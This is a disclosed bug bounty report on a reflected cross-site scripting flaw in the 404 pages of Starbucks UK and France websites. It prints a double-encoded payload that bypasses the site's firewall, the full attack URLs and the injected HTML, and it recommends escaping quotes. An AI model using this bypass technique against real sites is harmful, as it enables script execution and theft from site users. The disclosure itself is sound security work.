Summary:
@stealthy discovered that invalid page requests resulting in a 404 error page response were vulnerable to Reflected Cross-site Scripting (XSS) when double encoding a link and persuading the user to press an unusual key combination.

Thank you @stealthy for bringing this to our attention and helping to resolve the issue.
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Please indicate NA, if not applicable. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!

**Summary:** [Many Starbucks websites are vulnerable to cross-site scripting on 404 pages because double quotes lack sanitizing in hidden input tags, which leads to JavaScript execution.]

**Description:** [Starbucks employs a WAF which redirects any URL with a double quote to an error page. However, using double encoding, this can be bypassed. I used double encoding for most of the payload, which includes white spaces. My payload is below.

```text
htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm`1`%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1
```
The payload is just the on click event with the access key set as x, and the rest of a Starbucks URL added as an arbitrary parameter to make sure the onclick event works.
```text
htp8bi2zcg" accesskey='x' onclick='confirm`1`' //2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1
```
This vulnerability affects multiple Starbucks websites. Two are listed below.

    https://www.starbucks.co.uk/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1

    https://www.starbucks.fr/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1

The vulnerable HTML is below.
```html
<link rel="canonical" href="https://www.starbucks.co.uk/htp8bi2zcg" accesskey="x" onclick="confirm`1`" 2injectiontrme47nbfq="" blonde="" bright-sky-blend="" ground="1&quot;">
```
As you can see, the injection is successful.]

**Platform(s) Affected:** [Tested in Firefox Quantum 67.0.]

## How can the system be exploited with this bug?
Execute arbitrary JavaScript in a victim's browser to steal information or perform unwanted actions on the victim's behalf.

## How did you come across this bug ?
I was trying to bypass the double quote filter for SQL injection and came across this XSS when I looked at the HTML.

## Recommendations for fix
 
* Escape double quotes.

## Impact

JavaScript is against Starbucks users on multiple critical domains. JavaScript execution results in information theft and an attacker can perform unwanted actions on a victim's behalf.
